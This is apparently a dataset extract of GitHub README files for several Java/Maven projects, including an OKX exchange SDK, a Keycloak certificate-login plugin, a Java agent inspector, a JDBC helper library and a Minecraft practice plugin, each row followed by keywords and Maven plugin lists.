    - [x] [Economic calendar channel](https://www.okx.com/docs-v5/en/#public-data-websocket-economic-calendar-channel)
  - [Funding Account](https://www.okx.com/docs-v5/en/#funding-account-websocket)
    - [x] [Deposit info channel](https://www.okx.com/docs-v5/en/#funding-account-websocket-deposit-info-channel)
    - [x] [Withdrawal info channel](https://www.okx.com/docs-v5/en/#funding-account-websocket-withdrawal-info-channel)

## How to use

### Maven

```xml

<dependency>
    <groupId>xyz.felh</groupId>
    <artifactId>okx-v5-java</artifactId>
    <version>0.5.2024072701</version>
</dependency>
```

### Gradle

```yaml
implementation group: 'xyz.felh', name: 'okx-v5-java', version: '0.5.2024072701'
```

### sbt

```javascript
libraryDependencies += ""xyz.felh"" % ""okx-v5-java"" % ""0.5.2024072701""
```

## Important

- #### Automatically login when reconnected websocket if it has been login to PRIVATE channel
- #### Automatically restore all subscribe channels when reconnected websocket


## License

Published under the MIT License (https://github.com/forestwanglin/okx-v5-java/blob/main/LICENSE)",0,0,1,0.0,"['sdk', 'api', 'status', 'rest', 'api', 'websocket', 'api', 'how', 'use', 'maven', 'gradle', 'sbt', 'important', 'automatically', 'login', 'reconnected', 'websocket', 'login', 'private', 'channel', 'automatically', 'restore', 'subscribe', 'channel', 'reconnected', 'websocket', 'license']","['api', 'websocket', 'automatically', 'login', 'reconnected']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-source-plugin]",0.0,1.0,0.0
core247/keycloak-eds-plugin,main,"# Keycloak EDS plugin
The Keycloak plugin for certificate-based authentication enables the use of 
X.509 certificates for user authentication.
When a user attempts to log in, the plugin prompts the user to present a certificate. 
If the user's client certificate is supported, authentication will be based on the 
information contained within that certificate.
The user certificate plugin provides security by allowing users to authenticate using 
two-factor authentication. This means the user must provide something they know (password)
and something they are in possession of (certificate).
The plugin can also be configured to perform additional checks such as checking the
Certificate Revocation List (CRL)(see revoke-api documentation part below)
In essence, the Keycloak plugin for certificate-based authentication provides 
outstanding security and flexibility for the users and administrators of your system.

It was developed and tested against **Keycloak 22.0.4**. 
Compatibility with other versions of Keycloak is not guaranteed.

## License
This project is licensed under the Apache License 2.0 - see the [LICENSE](LICENSE) file for details.

## Getting Help

If you find a bug or an issue, please

[report an issue](https://github.com/core247/keycloak-eds-plugin/issues/new) on the keycloak eds plugin repository

## Contributing

See the [contributing documentation](CONTRIBUTING.md)

## What does plugin provides:
- Implement secondary sign-in step in the browser flow.
- Validate and perform revocation checks on certificates.
- Verify users based on their user attributes.

## Local development
- Use `Amazon Corretto 17` as the SDK.

- For local development, put these libraries in the `libs` folder:
    - `commons-logging-1.1.1.jar`
    - `kalkancrypt-0.7.2.jar`
    - `kalkancrypt_xmldsig-0.4.jar`
    - `knca_provider_util-0.8.jar`
    - `xmlsec-1.5.8.jar`

- Build the plugin with Maven using `mvn clean package`.

- - Use docker-compose to launch Keycloak with the plugin:
```
cd docker
docker-compose up -d
```

## Configuring Keycloak for Local Testing

[KEYCLOAK-CONFIGURE.md](KEYCLOAK-CONFIGURE.md)

## Using on production

For production use, you should place the Keycloak plugin JAR file and other 
Kalkan libraries in the same location as specified in the docker-compose file:

- Place the `eds-plugin-corporate-1.0.0.jar` file in the `/opt/bitnami/keycloak/providers/eds-plugin-corporate.jar` directory. 
  The path should look like this: `../eds-plugin-corporate/target/eds-plugin-corporate-1.0.0.jar:/opt/bitnami/keycloak/providers/eds-plugin-corporate.jar`
- Place the `eds-plugin-individual-1.0.0.jar` file in the `/opt/bitnami/keycloak/providers/eds-plugin-individual.jar` directory.
  The path should look like this: `../eds-plugin-individual/target/eds-plugin-individual-1.0.0.jar:/opt/bitnami/keycloak/providers/eds-plugin-individual.jar`
- Place the contents of the `libs` directory in the `/opt/bitnami/keycloak/providers` directory. 
  The path should look like this: `../libs/:/opt/bitnami/keycloak/providers/`
- Configure user attributes in keycloak
  - For individual users to be able to use the plugin, you need to add an attribute named 
    `initials` to the user's attributes. This attribute should contain the User's Tax Code. 
     The plugin will use this specific attribute for identification purposes.
  - For corporate users, you need to add the attribute userClass representing the 
    Corporate's BIN (Tax Code). Similar to individual users, this attribute enhances the 
    plugin's capability to identify a corporate user.
- Additionally, for handling certificate revocations, you should refer to the documentation in the revoke-api section below.

### revoke-api
The `revoke-api` module is designed to facilitate setting up certificate verification 
according to your custom implementation. You can extend and tailor the functionality 
of the certificate verifier to satisfy your specific needs.

By default, the system utilizes the `kz.core247.keycloak.eds.revoke.NullCommonCertificateVerifier` implementation 
if no custom implementation is provided by the user. This default implementation consistently
returns a positive (true) result.

#### Steps
- Implement the `kz.core247.keycloak.eds.revoke.CommonCertificateVerifier` interface.
Start by creating a class that implements the CommonCertificateVerifier interface. 
Your class should have defined all methods indicated in the interface.

Refer to the `kz.core247.example.RandomCommonCertificateVerifier` in the `random-revoke-api-impl` module 
as an illustrative example of this implementation.

- Specify the Location of the JAR in Docker Setup
  If you are using Docker, you will need to add the JAR file to your Keycloak setup. Specify the location of the jar file in your docker-compose.yml file.
  ```volumes:
    - ../random-revoke-api-impl/target/random-revoke-api-impl-1.0.0.jar:/opt/bitnami/keycloak/providers/random-revoke-api-impl.jar```

- Configure system properties
  Delineate your custom class through the utilization of system properties. Particularly, apply the 'INDIVIDUAL_CERT_VERIFIER_CLASS_NAME' and 'CORPORATE_CERT_VERIFIER_CLASS_NAME' properties.
  When deploying with Docker, system properties can be set in the environment configuration. For example:
  ```
     JAVA_OPTS_APPEND: -DINDIVIDUAL_CERT_VERIFIER_CLASS_NAME=kz.core247.example.RandomCommonCertificateVerifier
  ```
  Replace `kz.core247.example.RandomCommonCertificateVerifier` with your implemented class. This allows the revoke-api module to use your custom class for certificate verification.",0,2,1,0.0,"['keycloak', 'ed', 'plugin', 'license', 'get', 'help', 'contribute', 'what', 'plugin', 'provide', 'local', 'development', 'configure', 'keycloak', 'local', 'testing', 'use', 'production', 'step']","['keycloak', 'plugin', 'local', 'ed', 'license']",7.0,"[com.mycila:license-maven-plugin,maven-assembly-plugin,org.apache.maven.plugins:maven-compiler-plugin]",0.0,6.0,1.0
parttimenerd/meta-agent,main,"Meta-Agent
==========

Who instruments the instrumenter? This project is a Java agent that instruments Java agents,
or specifically, it instruments the ClassFileTransformers of other agents to observe how they transform
the bytecode of classes.

This is especially useful to check what libraries like [Mockito](https://site.mockito.org/) do to your classes at runtime.

To run it, build the project with `mvn package -DskipTests` and run your Java program with the agent:

```shell
java -javaagent:target/meta-agent.jar -jar your-program.jar

# or run a Mockito based sample test
mvn package -DskipTests
mvn test -DargLine=""-javaagent:target/meta-agent.jar""
```

The executed [MockitoTest](src/test/java/me/bechberger/meta/MockitoTest.java) looks as follows:

```java
@ExtendWith(MockitoExtension.class)
public class MockitoTest {

  @Mock
  List<String> mockedList;

  @Test
  public void whenNotUseMockAnnotation_thenCorrect() throws InterruptedException {
    mockedList.add(""one"");
    Mockito.verify(mockedList).add(""one"");
    assertEquals(0, mockedList.size());

    Mockito.when(mockedList.size()).thenReturn(100);
    assertEquals(100, mockedList.size());

    Thread.sleep(10000000L);
  }
}
```

Opening [localhost](http://localhost:7071) will show you a list of available commands, most importantly
- [/help](http://localhost:7071) to show the help, available comands and decompilation and output options
- [/instrumentators](http://localhost:7071/instrumentators) to list all instrumentators (ClassFileTransformers) that have been used
- [/full-diff/instrumentator?pattern=.*](http://localhost:7071/full-diff/instrumentator?pattern=.*)
  to show the full diff for all instrumentators
- [/classes](http://localhost:7071/classes) to list all classes that have been transformed
- [/full-diff/class?pattern=.*](http://localhost:7071/full-diff/class?pattern=.*)
  to show the full diff for all classes and all instrumentators
- [/all/decompile?pattern=<pattern>](http://localhost:7071/all/decompile?pattern=<pattern>)
  to decompile the classes matching the pattern

In our example, we can see via [/instrumentators](http://localhost:7071/instrumentators) that Mockito uses
the `org.mockito.internal.creation.bytebuddy.InlineByteBuddyMockMaker` to transform classes.
Using [/full-diff/instrumentator/.*](http://localhost:7071/full-diff/instrumentator/.*), we can see the diff of all
transformations that this instrumentator has done:

![Screenshot of http://localhost:7071/full-diff/instrumentator/.*](img/instrumentators.png)

Yet we also see via [/classes](http://localhost:7071/classes) that Mockito only transforms the `java.util.List` 
interface and all its parents:

![Screenshot of http://localhost:7071/classes](img/classes.png)

How this works
--------------

The agent wraps all ClassFileTransformers with a custom transformer that records the diff of the bytecode.
It then uses [vineflower](http://vineflower.org/) to decompile the bytecode and 
[diff](https://www.gnu.org/software/diffutils/)
to compute the diff between the original and the transformed bytecode.

The front-end is implemented using the built-in HttpServer as a simple web server started by the agent.

This is essentially a more capable version of the [classviewer-agent](https://github.com/parttimenerd/classviewer-agent).-

Contributions
-------------
If you have sample programs where this tool helped to see something interesting, please share.
Contributions, issues and PRs are welcome.

License
-------
MIT, Copyright 2024 SAP SE or an SAP affiliate company, Johannes Bechberger
and meta-agent agent contributors
",1,0,1,1.0,"['run', 'mockito', 'base', 'sample', 'test']","['run', 'mockito', 'base', 'sample', 'test']",1.0,"[maven-assembly-plugin,org.apache.maven.plugins:maven-shade-plugin,org.codehaus.mojo:exec-maven-plugin]",0.0,1.0,0.0
joyheros/realworld,main,"# ![RealWorld Example App](./logo.png)

**ä¸­æ–‡** | [English](./README.en-US.md)

**Java 21 + SpringBoot 3 + MyBatis** ä»£ç åº“åŒ…å«ç¬¦åˆ[RealWorld](https://github.com/gothinkster/realworld)è§„èŒƒå’ŒAPIçš„çœŸå®ç¤ºä¾‹(CRUD, authï¼Œé«˜çº§æ¨¡å¼ç­‰)ã€‚  

åˆ›å»ºè¿™ä¸ªä»£ç åº“æ˜¯ä¸ºäº†æ¼”ç¤ºä¸€ä¸ªç”¨**Java 21 + SrpingBoot 3 + MyBatis**æ„å»ºçš„æˆç†Ÿçš„å…¨æ ˆåº”ç”¨ç¨‹åºï¼ŒåŒ…æ‹¬CRUDæ“ä½œã€èº«ä»½éªŒè¯ã€è·¯ç”±ã€åˆ†é¡µç­‰åŠŸèƒ½ã€‚  

æˆ‘ä»¬ç«­å°½å…¨åŠ›åšæŒJava, SpringBootå’ŒMyBatisçš„ç¤¾åŒºé£æ ¼æŒ‡å—å’Œæœ€ä½³å®è·µã€‚  

æœ‰å…³å¦‚ä½•ä¸å…¶ä»–å‰ç«¯/åç«¯ä¸€èµ·å·¥ä½œçš„æ›´å¤šä¿¡æ¯ï¼Œè¯·è®¿é—®[RealWorld](https://github.com/gothinkster/realworld)ã€‚  

# é¡¹ç›®ç‰¹ç‚¹

* ä½¿ç”¨é¢†åŸŸé©±åŠ¨è®¾è®¡çš„æ€æƒ³æ¥åˆ†ç¦»ä¸šåŠ¡é€»è¾‘å’ŒåŸºç¡€è®¾æ–½ã€‚  
* ä½¿ç”¨MyBatiså®ç°[Data Mapper](https://martinfowler.com/eaaCatalog/dataMapper.html)æŒä¹…åŒ–æ¨¡å—ã€‚  
* å°†åº”ç”¨ç¨‹åºåˆ†ç¦»ä¸ºå¤šä¸ªæ¨¡å—ï¼Œå¹¶ä½¿ç”¨Mavenè¿›è¡Œç»„ç»‡ã€‚  

æœ¬é¡¹ç›®ä»£ç åˆ†ä¸º4ä¸ªæ¨¡å—:  
1. app-permissionæ¨¡å—åŒ…æ‹¬ä¸æƒé™ç›¸å…³çš„å®ä½“ï¼ŒåŒ…æ‹¬åº”ç”¨çš„ç”¨æˆ·ã€é…ç½®æ–‡ä»¶å’Œå®‰å…¨æœºåˆ¶ã€‚  
2. app-commoné€šç”¨æ¨¡å—åŒ…æ‹¬å…³äºå¼‚å¸¸å®šä¹‰çš„é€šç”¨å®ç°ã€‚  
3. app-articleæ¨¡å—åŒ…æ‹¬æ–‡ç« å‘å¸ƒ/ç¼–è¾‘/åˆ é™¤ç­‰ä¸šåŠ¡é€»è¾‘ã€‚  
4. app-mainæ¨¡å—æ˜¯å¯åŠ¨åº”ç”¨ç¨‹åºçš„åº”ç”¨ç¨‹åºå…¥å£ç¨‹åºã€‚  

åº”ç”¨ç¨‹åºçš„é€»è¾‘åˆ†å±‚ç»„ç»‡å¦‚ä¸‹:
1. `application`æ˜¯ç”±Spring MVCå’Œé«˜å±‚æœåŠ¡å®ç°çš„webå±‚ã€‚  
2. `domain`æ˜¯ä¸šåŠ¡æ¨¡å‹å±‚ï¼ŒåŒ…å«äº†é¢†åŸŸå¯¹è±¡çš„å®šä¹‰ã€‚  
3. `infra`å±‚åŒ…å«ç”¨MyBatiså®ç°çš„æ‰€æœ‰æ•°æ®è®¿é—®ç±»ã€‚  

# å®‰å…¨  

èº«ä»½éªŒè¯å’Œæˆæƒç®¡ç†ä½¿ç”¨Spring Securityæ¥å®ç°ï¼Œå¹¶ä½¿ç”¨JWTè¿›è¡ŒåŸºäºä»¤ç‰Œçš„èº«ä»½éªŒè¯ã€‚æ­¤å¤–ï¼Œå€ŸåŠ©Spring Bootçš„å„ç§ç‰¹æ€§æ¥å®ç°å¼‚å¸¸å¤„ç†ã€æµ‹è¯•ç­‰åŠŸèƒ½ã€‚  

# æ•°æ®åº“  

æœ¬é¡¹ç›®ä½¿ç”¨MariaDBæ•°æ®åº“æ¥å­˜å‚¨åº”ç”¨ç¨‹åºæ•°æ®ï¼Œæ‚¨å¯ä»¥é€šè¿‡æ‰§è¡Œapp-main/src/main/resourcesç›®å½•ä¸‹çš„schema.sqlæ¥åˆå§‹åŒ–æ•°æ®åº“ã€‚  


# å¦‚ä½•å·¥ä½œ    

éœ€è¦å®‰è£…JDK 21ã€‚  
éœ€è¦å®‰è£…MariaDBã€‚  

## æ•°æ®åº“åˆå§‹åŒ–  

åœ¨MariaDBå‘½ä»¤çª—å£ä¸­æ‰§è¡Œapp-main/src/main/resources/schema.sqlåˆå§‹åŒ–æ•°æ®åº“ã€‚  
åœ¨app-permission.propertieså’Œapp-article.propertiesä¸­æ ¹æ®ä½ çš„æ•°æ®åº“å‚æ•°ä¿®æ”¹æ•°æ®åº“å‚æ•°ã€‚  

## ç¼–è¯‘application
åœ¨é¡¹ç›®çš„æ ¹ç›®å½•ä¸‹æ‰§è¡Œ: mvn install

## æµ‹è¯•application
åœ¨é¡¹ç›®çš„æ ¹ç›®å½•ä¸‹æ‰§è¡Œ: mvn test

## æ‰§è¡Œapplication
åœ¨app-mainçš„æ ¹ç›®å½•ä¸‹æ‰§è¡Œ: mvn spring-boot:run

## é¡¹ç›®åœ°å€

- [realworld](https://github.com/joyheros/realworld)  

## å¦‚ä½•è´¡çŒ®

**Pull Request:**

1. Fork ä»£ç !
2. åˆ›å»ºè‡ªå·±çš„åˆ†æ”¯: `git checkout -b feature/xxxx`
3. æäº¤ä½ çš„ä¿®æ”¹: `git commit -m 'feature: add xxxxx'`
4. æ¨é€æ‚¨çš„åˆ†æ”¯: `git push origin feature/xxxx`
5. æäº¤: `pull request`

## Git è´¡çŒ®æäº¤è§„èŒƒ

- å‚è€ƒ [vue](https://github.com/vuejs/vue/blob/dev/.github/COMMIT_CONVENTION.md) è§„èŒƒ

  - `feat` : æ–°å¢åŠŸèƒ½
  - `fix` : ä¿®å¤ç¼ºé™·
  - `docs` : æ–‡æ¡£å˜æ›´
  - `style` : ä»£ç æ ¼å¼
  - `refactor` : ä»£ç é‡æ„
  - `perf` : æ€§èƒ½ä¼˜åŒ–
  - `test` : æ·»åŠ ç–æ¼æµ‹è¯•æˆ–å·²æœ‰æµ‹è¯•æ”¹åŠ¨
  - `build` : æ„å»ºæµç¨‹ã€å¤–éƒ¨ä¾èµ–å˜æ›´ (å¦‚å‡çº§ npm åŒ…ã€ä¿®æ”¹æ‰“åŒ…é…ç½®ç­‰)
  - `ci` : ä¿®æ”¹ CI é…ç½®ã€è„šæœ¬
  - `revert` : å›æ»š commit
  - `chore` : å¯¹æ„å»ºè¿‡ç¨‹æˆ–è¾…åŠ©å·¥å…·å’Œåº“çš„æ›´æ”¹ (ä¸å½±å“æºæ–‡ä»¶)
  - `wip` : æ­£åœ¨å¼€å‘ä¸­
  - `types` : ç±»å‹å®šä¹‰æ–‡ä»¶ä¿®æ”¹

## æ„Ÿè°¢ä»¥ä¸‹é¡¹ç›®æä¾›å¸®åŠ©

- [gothinkster](https://github.com/gothinkster/realworld)  
- [spring-boot-realworld-example-app](https://github.com/gothinkster/spring-boot-realworld-example-app)  

## ç»´æŠ¤è€…

[@joyheors](https://github.com/joyheros)  

## `Star`

éå¸¸æ„Ÿè°¢ç•™ä¸‹æ˜Ÿæ˜Ÿçš„å¥½å¿ƒäººï¼Œæ„Ÿè°¢æ‚¨çš„æ”¯æŒ :heart:",0,0,1,0.0,"['realworld', 'example', 'app', 'git', 'star']","['realworld', 'example', 'app', 'git', 'star']",5.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,4.0,1.0
bowbahdoe/jdbc,main,"# JDBC

Utilities for working with the raw JDBC api. 

Includes

* Utilities for reading data from `ResultSet`s
* An `UncheckedSQLException` for when throwing a `SQLException` is inconvenient, but might need to be recovered later.
* A `SettableParameter` interface, for when String Templates are re-previewed.

## Dependency Information

### Maven

```xml
<dependency>
    <groupId>dev.mccue</groupId>
    <artifactId>jdbc</artifactId>
    <version>2024.08.11</version>
</dependency>
```


### Gradle

```groovy
dependencies {
    implementation(""dev.mccue:jdbc:2024.08.11"")
}
```


## Usage

These examples use [sqlite](https://central.sonatype.com/artifact/org.xerial/sqlite-jdbc). 

<!--

### Select rows by id

Any variables injected into the template will be replaced with `?`s in the
SQL and will be set with `.setObject` on the returned `PreparedStatement`.

```java
import dev.mccue.jdbc.StatementPreparer;

void main() throws Exception {
    var db = new SQLiteDataSource();
    db.setUrl(""jdbc:sqlite:test.db"");

    var id = 1;
    try (var conn = db.getConnection()) {
        try (var stmt = StatementPreparer.of(conn).""""""
                SELECT *
                FROM widget
                WHERE id = \{id}
                """""") {
            var rs = stmt.executeQuery();
        }
    }
}
```

### Select rows by ids

List parameters are automatically expanded into `(?, ?, ?)` with
one question mark for each element in the list.

```java
import dev.mccue.jdbc.StatementPreparer;

void main() throws Exception {
    var db = new SQLiteDataSource();
    db.setUrl(""jdbc:sqlite:test.db"");

    var ids = List.of(1, 2, 3);
    try (var conn = db.getConnection()) {
        try (var stmt = StatementPreparer.of(conn).""""""
                SELECT *
                FROM widget
                WHERE id IN \{ids}
                """""") {
            var rs = stmt.executeQuery();
        }
    }
}
```

### Inject parameters with custom logic

To inject a parameter that needs to be set with something other than `setObject`,
you can make an instance of `SettableParameter`.

```java
import dev.mccue.jdbc.SettableParameter;
import dev.mccue.jdbc.StatementPreparer;

void main() throws Exception {
    var db = new SQLiteDataSource();
    db.setUrl(""jdbc:sqlite:test.db"");

    var name = ""bob"";
    try (var conn = db.getConnection()) {
        try (var stmt = StatementPreparer.of(conn).""""""
                SELECT *
                FROM widget
                WHERE name = \{SettableParameter.ofNString(name)}
                """"""){
            var rs = stmt.executeQuery();
        }
    }
}
```
-->

### Read nullable primitive types

`ResultSets` includes helpers for reading potentially null
primitive types from a `ResultSet`

```java
import dev.mccue.jdbc.ResultSets;

void main() throws Exception {
    var db = new SQLiteDataSource();
    db.setUrl(""jdbc:sqlite:test.db"");

    try (var conn = db.getConnection()) {
        try (var stmt = conn.prepareStatement(""""""
                SELECT number
                FROM widget
                LIMIT 1
                """""")) {
            var rs = stmt.executeQuery();

            // Methods exist for all primitives except char 
            // (which doesn't have a method on ResultSet)
            var number = ResultSets.getIntegerNullable(rs, ""number"");
        }
    }
}
```

### Read non-null primitive types

If you want to read a column that is primitive, but you assume
is not null, there are helpers which will throw a `SQLException`
early if that assumption is violated.

```java
import dev.mccue.jdbc.ResultSets;

void main() throws Exception {
    var db = new SQLiteDataSource();
    db.setUrl(""jdbc:sqlite:test.db"");

    try (var conn = db.getConnection()) {
        try (var stmt = conn.prepareStatement(""""""
                SELECT number
                FROM widget
                LIMIT 1
                """""")) {
            var rs = stmt.executeQuery();

            // Methods exist for all primitives except char 
            // (which doesn't have a method on ResultSet)
            var number = ResultSets.getIntegerNotNull(rs, ""number"");
        }
    }
}
```

### Read a row as a `Record`

Often when going through a `ResultSet` you will want to materialize a whole row.

```java
import dev.mccue.jdbc.ResultSets;

public record Widget(int number) {}

void main() throws Exception {
    var db = new SQLiteDataSource();
    db.setUrl(""jdbc:sqlite:test.db"");

    try (var conn = db.getConnection()) {
        try (var stmt = conn.prepareStatement(""""""
                SELECT number
                FROM widget
                LIMIT 1
                """""")) {
            var rs = stmt.executeQuery();
            var widget = ResultSets.getRecord(rs, Widget.class);

            System.out.println(widget);
        }
    }
}
```


### Read a row as a `Record` with customized mappings

If the name of a record component doesn't line up with what you want pulled from a
`ResultSet`, you can use the `@Column` annotation.

```java
import dev.mccue.jdbc.Column;
import dev.mccue.jdbc.ResultSets;

public record Widget(@Column(label = ""number"") int n) {
}

void main() throws Exception {
    var db = new SQLiteDataSource();
    db.setUrl(""jdbc:sqlite:test.db"");

    try (var conn = db.getConnection()) {
        try (var stmt = conn.prepareStatement(""""""
                SELECT number
                FROM widget
                LIMIT 1
                """""")) {
            var rs = stmt.executeQuery();
            var widget = ResultSets.getRecord(rs, Widget.class);

            System.out.println(widget);
        }
    }
}
```

<!--
### Read a row as a `Record`, customizing how a column is gotten from a `ResultSet`.

```java
import dev.mccue.jdbc.Column;
import dev.mccue.jdbc.DefaultRecordComponentGetter;
import dev.mccue.jdbc.ResultSets;

import java.lang.reflect.RecordComponent;
import java.sql.ResultSet;
import java.sql.SQLException;

public record Text(String contents) {}

public static final class CustomRecordComponentGetter 
        extends DefaultRecordComponentGetter {
    @Override
    protected Object getIndexedRecordComponent(
            ResultSet rs, 
            RecordComponent recordComponent, 
            int index
    ) throws SQLException {
        return new Text(rs.getString(index));
    }

    @Override
    protected Object getLabeledRecordComponent(
            ResultSet rs, 
            RecordComponent recordComponent, 
            String label
    ) throws SQLException {
        return new Text(rs.getString(label));
    }
}

public record Widget(
        @Column(label = ""number"") 
        int n,
        @Column(
                recordComponentGetter = CustomRecordComponentGetter.class
        )
        Text name) {
}

void main() throws Exception {
    var db = new SQLiteDataSource();
    db.setUrl(""jdbc:sqlite:test.db"");

    try (var conn = db.getConnection()) {
        try (var stmt = conn.prepareStatement(""""""
                SELECT number, name
                FROM widget
                LIMIT 1
                """""")) {
            var rs = stmt.executeQuery();
            var widget = ResultSets.getRecord(rs, Widget.class);

            System.out.println(widget);
        }
    }
}
```

-->",9,0,1,0.0,"['jdbc', 'dependency', 'information', 'maven', 'gradle', 'usage', 'select', 'row', 'id', 'select', 'row', 'id', 'inject', 'parameter', 'custom', 'logic', 'read', 'nullable', 'primitive', 'type', 'read', 'primitive', 'type', 'read', 'row', 'record', 'read', 'row', 'record', 'customized', 'mapping', 'read', 'row', 'record', 'customize', 'column', 'gotten', 'resultset']","['row', 'read', 'record', 'select', 'id']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.jreleaser:jreleaser-maven-plugin]",0.0,1.0,0.0
Devlrxxh/Neptune,master,"# Neptune | 1.20 Practice Core

![pfp](https://github.com/Devlrxxh/Neptune/assets/125221056/c9ec6441-34c8-472e-9fe3-1bd20a3b31db)

ğŸ“–**Features:**  
â€¢ Arena System (Shared, Standalone)  
â€¢ Kit System (Boxing, Crystal, Axe, etc.)  
â€¢ Kit Editor with Inventories  
â€¢ View match System  
â€¢ Queue Ping Range System (Soon)  
â€¢ Animated Scoreboard System  
â€¢ Placeholder API (Compatibility)  
â€¢ All hotbars items configurable  
â€¢ All messages configurable  
â€¢ Advanced Arena system  
â€¢ Player Statistics  
â€¢ Player Particle Death Effects (Soon)  
â€¢ Nearly everything is customizable (Menus, scoreboard, etc.)  
â€¢ Easy to use managment menus

ğŸ“**Requirements:**  
â€¢ (Optional) FastAsyncWorldEdit  
â€¢ Mongo Database

ğŸ–¼ï¸**Media:**
![image](https://github.com/Devlrxxh/Neptune/assets/125221056/6e0d63dd-f0f0-4165-ac0e-1b7d6f66f588)
![image](https://github.com/Devlrxxh/Neptune/assets/125221056/bad14a9b-b742-45e1-923a-0317cd07d37e)
![image](https://github.com/Devlrxxh/Neptune/assets/125221056/f60d56fc-1b24-478b-9ccc-4ab2711f4b42)
![image](https://github.com/Devlrxxh/Neptune/assets/125221056/86281423-a371-44fe-a13b-3a86a8dd150b)
![image](https://github.com/Devlrxxh/Neptune/assets/125221056/ee05f045-a03a-4fce-9c54-6849107e0ecb)
![image](https://github.com/Devlrxxh/Neptune/assets/125221056/9957b2a0-8292-4cb3-9e80-ca7c8442a70c)
![image](https://github.com/Devlrxxh/Neptune/assets/125221056/cd7adf54-f4b3-425c-add5-99cad13b6174)
![image](https://github.com/Devlrxxh/Neptune/assets/125221056/f2b0436a-3d37-47b1-839b-588ead692227)

ğŸ–¥ï¸**Test Server:**
IP: aegis.rip
",14,1,1,9.0,"['neptune', 'practice', 'core']","['neptune', 'practice', 'core']",6.0,"[maven-compiler-plugin,maven-shade-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-shade-plugin]",0.0,5.0,1.0
LovetheFrogs/OptiGraph,main,"# OptiGraph

Optimum graph creation and distribution for underground networks.

## Downloading

You can either download a pre-compiled version or compile one yourself.

### Download a compiled version

You can head to the releases section and download the latest version. Extract the file and run the jar file.

### Compiling Optigraph for yourself

Assuming you have git installed, run

```git clone https://github.com/LovetheFrogs/OptiGraph```

then run `cd OptiGraph`, compile it with `mvn install` and run the .jar file with `java -jar target/OptiGraph-1.0-shaded.jar`.

## Using OptiGraph

To use the app, just add your nodes/stations to the graph and plot them. You can change the algorithm used by clicking Settings > Change Mode and delete stations by giving an id and pressing the delete node button.

OptiGraph also has functionality to save and load graphs using File menu.

![image](https://github.com/LovetheFrogs/OptiGraph/assets/102818341/f8070dcf-9f5b-442d-ac37-10b012a070e7)

## Use cases

Optigraph can be used to plan out metro systems. One interesting use case is the design of minecraft piston-bolt networks for least space traveled between any two stations.

## Colaborating

You can submit a bug report by filling out the bug template in the issues section. You can also collaborate by submiting a pull request. All reasonable pull requests will be reviewed.

",2,1,1,20.0,"['optigraph', 'download', 'download', 'compile', 'version', 'compile', 'optigraph', 'use', 'optigraph', 'use', 'case', 'colaborating']","['optigraph', 'download', 'compile', 'use', 'version']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-shade-plugin,org.openjfx:javafx-maven-plugin]",0.0,1.0,0.0
hardingadonis/saledock,main,"# Sale Dock

[![build](https://github.com/hardingadonis/saledock/actions/workflows/build.yml/badge.svg)](https://github.com/hardingadonis/saledock/actions/workflows/build.yml)
[![publish](https://github.com/hardingadonis/saledock/actions/workflows/publish.yml/badge.svg)](https://github.com/hardingadonis/saledock/actions/workflows/publish.yml)
[![release](https://github.com/hardingadonis/saledock/actions/workflows/release.yml/badge.svg)](https://github.com/hardingadonis/saledock/actions/workflows/release.yml)
[![CodeFactor](https://www.codefactor.io/repository/github/hardingadonis/saledock/badge)](https://www.codefactor.io/repository/github/hardingadonis/saledock)
![GitHub contributors](https://img.shields.io/github/contributors/hardingadonis/saledock)
![GitHub top language](https://img.shields.io/github/languages/top/hardingadonis/saledock)
![GitHub repo size](https://img.shields.io/github/repo-size/hardingadonis/saledock)
![GitHub License](https://img.shields.io/github/license/hardingadonis/saledock)

> SWP391 project, ERP system, Sales module

## Requirements

- JDK 17
- MySQL 8.2.0
- Tomcat 10
- Maven 3+

## Database

<details>
  <summary>Database</summary>

  <div style=""margin-top: 20px"">
    <a href=""https://github.com/hardingadonis/saledock"">
      <img src=""database/database.svg""/>
    </a>
  </div>
</details>

## Development

- You need to install the requirements above.

#### 1. Clone `Sale Dock`:

```bash
git clone https://github.com/hardingadonis/saledock.git
```

#### 2. Open `Sale Dock`:

- You can open `Sale Dock` with your favorite IDE:
  - [IntelliJ IDEA](https://www.jetbrains.com/idea/)
  - [Eclipse](https://www.eclipse.org/)
  - [NetBeans](https://netbeans.apache.org/)

#### 3. Build `Sale Dock` with `Maven` (Optional):

```bash
cd saledock
mvn verify
```

## Deployment

- Open Installation Guide: [Installation Guide](docs/INSTALLATION_GUIDE.md)

## Contributors

<!-- ALL-CONTRIBUTORS-LIST:START - Do not remove or modify this section -->
<!-- prettier-ignore-start -->
<!-- markdownlint-disable -->
<table>
  <tbody>
    <tr>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://github.com/hardingadonis""><img src=""https://avatars.githubusercontent.com/u/34091632?v=4"" width=""100px;"" alt=""""/><br /><sub><b>Minh VÆ°Æ¡ng</b></sub></a></td>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://github.com/bakaqc""><img src=""https://avatars.githubusercontent.com/u/126387856?v=4"" width=""100px;"" alt=""""/><br /><sub><b>Äinh Quá»‘c ChÆ°Æ¡ng</b></sub></a></td>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://github.com/htnghia1423""><img src=""https://avatars.githubusercontent.com/u/137130942?v=4"" width=""100px;"" alt=""""/><br /><sub><b>Thunder</b></sub></a></td>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://github.com/yuhtnguyen""><img src=""https://avatars.githubusercontent.com/u/137138731?v=4"" width=""100px;"" alt=""""/><br /><sub><b>Yuht</b></sub></a></td>
      <td align=""center"" valign=""top"" width=""20%""><a href=""https://github.com/linhlm0210""><img src=""https://avatars.githubusercontent.com/u/147788973?v=4"" width=""100px;"" alt=""""/><br /><sub><b>linhlm0210</b></sub></a></td>
    </tr>
    <tr>
